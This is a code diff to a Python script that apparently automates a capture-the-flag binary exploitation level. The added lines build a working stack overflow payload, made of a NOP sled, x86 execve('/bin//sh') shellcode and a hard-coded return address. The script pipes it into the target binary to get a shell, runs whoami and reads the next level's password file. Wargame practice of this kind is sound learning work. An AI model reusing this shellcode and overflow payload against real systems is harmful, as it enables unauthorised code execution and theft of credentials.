@@ -17,10 +17,13 @@ print_title('Test this file')
 
 binary_name = files_list[0]
 
-print_action(f'./{binary_name}')
-print_action('test', stdin=True)
-print_action('test', stdin=True)
-print_output('test test', 'Output')
+exec(client, f'echo "" | ./{binary_name}', title='Simple execute binary')
+print_title('Segfault')
+
+output = exec(
+    client, "(python -c \"print 'test'\"; python -c \"print 'test'\") | ./" + binary_name,
+    title='Execute and input two lines')
+print_output(output)
 print_title('Expected two input values and program just print both of it inline')
 
 entry_points = ['main', 'p', 'pp']
@@ -33,6 +36,17 @@ print_title(f'Three entry points {", ".join([f"{e} - {get_func_address(client, e
 get_func_structure(client, 'main', title='Call function pp (+16)')
 get_func_structure(client, 'pp', title='Call function p (+22)')
 get_func_structure(client, 'p', title='Call function p (+22)')
+
+f = lambda command: f'echo "{command}" | (python -c "print(\'\\x90\' * 3000 + \'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\')"; python -c "print(\'B\' * 14 + \'\\xa4\\xe6\\xff\\xbf\' + \'B\')"; cat) | ./{binary_name} | head -n 3'
+
+current_user = exec(client, f('whoami'), title='Check user')
+print_output(current_user, 'Current user')
+print(current_user)
+
+token = exec(client, f('cat /home/user/bonus1/.pass'))
+print(token)
+
+save_token(token, client)
 
 
 # shell_call_address = find_offset(client, stdin=True, pattern=f"\n01234567890123456789\n{PATTERN}", register='eip')
